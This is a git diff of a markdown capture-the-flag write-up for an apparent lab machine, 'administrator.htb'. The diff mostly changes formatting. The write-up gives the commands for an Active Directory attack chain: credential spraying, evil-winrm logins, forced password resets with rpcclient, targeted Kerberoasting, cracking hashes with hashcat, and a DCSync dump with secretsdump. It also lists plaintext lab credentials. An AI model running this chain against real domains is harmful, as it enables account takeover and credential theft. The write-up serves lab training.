@@ -22,6 +22,7 @@ NMAP
 ![image1](../resources/50e46876cd2243c5875f4d000d2a5a48.png)
 
 - Check creds:
+
 ```bash
 crackmapexec smb 10.10.11.42 -u "olivia" -p "ichliebedich"
 
@@ -30,6 +31,7 @@ crackmapexec smb 10.10.11.42 -u "olivia" -p "ichliebedich"
 ![image2](../resources/07a7fbc74a9a4430b6acaec81089d3f5.png)
 
 - WinRM in:
+
 ```bash
 evil-winrm -i 10.10.11.42 -u "olivia" -p "ichliebedich"
 
@@ -38,6 +40,7 @@ evil-winrm -i 10.10.11.42 -u "olivia" -p "ichliebedich"
 ![image3](../resources/a330f4d2344c4dd2bd8b5737b26aa317.png)
 
 - Run BloodHound:
+
 ```bash
 bloodhound-python -c all -d administrator.htb -dc dc.administrator.htb -u olivia -p "ichliebedich" -ns 10.10.11.42
 
@@ -55,6 +58,7 @@ bloodhound-python -c all -d administrator.htb -dc dc.administrator.htb -u olivia
 ![image7](../resources/1994c18fafa741a2b1bdc8b5ebcb1142.png)
 
 - Change passwords for users:
+
 ```bash
 rpcclient -U 'administrator.htb/olivia%ichliebedich' 10.10.11.42
 
@@ -65,6 +69,7 @@ rpcclient -U 'administrator.htb/michael%Password1' 10.10.11.42
 setuserinfo2 benjamin 23 'Password1'
 
 ```
+
 - We can remote in with Michael:
 
 ![image8](../resources/1c7be244480341b89c095e84a2595fe7.png)
@@ -77,9 +82,9 @@ And he has PowerView in his Documents folder
 - Shares doesn't show anything special
 
 - But he can log in to the ftp server:
+
 ```bash
 ftp 10.10.11.42
-
 ```
 
 ![image9](../resources/f6d47ff05f304409a87a88cfd036ebf7.png)
@@ -120,24 +125,22 @@ emma : WwANQWnmJnGV07WQN8bMS7FMAbjNur
 
 **<u>From Windows</u>**
 - Upload PowerView.ps1 and run:
+
 ```bash
 . .\Powerview.ps1
 
-Set-DomainObject -Identity **ethan** -Set @{serviceprincipalname="SPN/**ethan**"}
+Set-DomainObject -Identity ethan -Set @{serviceprincipalname="SPN/ethan}
 
 ```
 
 ![image15](../resources/fb6763e2b8584240a8e3cf5bc12ff489.png)
 
-```bash
 Remove the SPN After Obtaining the Hash:
 
+```bash
 Set-DomainObject -Identity target_user_samaccountname -Remove @{serviceprincipalname="SPN/targetuser"}
-
 sudo ntpdate -u 10.10.11.42
-
 impacket-GetUserSPNs administrator.htb/emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb -dc-ip 10.10.11.42 -request
-
 ```
 
 ![image16](../resources/5cf2fd9fc0434402a1958344e7cfa61d.png)
@@ -162,6 +165,7 @@ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rul
 **ethan : limpbizkit**
 
 - Ethan has DCSync rights:
+
 ```bash
 impacket-secretsdump administrator.htb/ethan:limpbizkit@10.10.11.42
 
